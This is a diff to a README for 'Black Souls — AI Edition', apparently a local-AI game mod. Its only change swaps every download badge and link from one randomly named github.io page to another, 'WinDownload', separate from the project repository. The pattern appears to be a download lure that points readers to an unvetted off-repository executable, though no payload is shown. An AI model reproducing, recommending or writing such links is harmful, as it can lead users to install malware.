@@ -2,9 +2,9 @@
 
 # Black Souls — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
-[![A ruined Wonderland](https://img.shields.io/badge/Wonderland-Corrupted-2b1b2b?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
+[![A ruined Wonderland](https://img.shields.io/badge/Wonderland-Corrupted-2b1b2b?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/stadiumsamuraileap/black-souls-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/stadiumsamuraileap/black-souls-ai-edition)
@@ -55,7 +55,7 @@ The AI plays the Alices and the storybook cast with the source material's specif
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://zenboulderagora.github.io/Windw/)**
+- **[⬇ Download the latest version](https://yobowgileysb.github.io/WinDownload/)**
 - [Repository](https://github.com/stadiumsamuraileap/black-souls-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
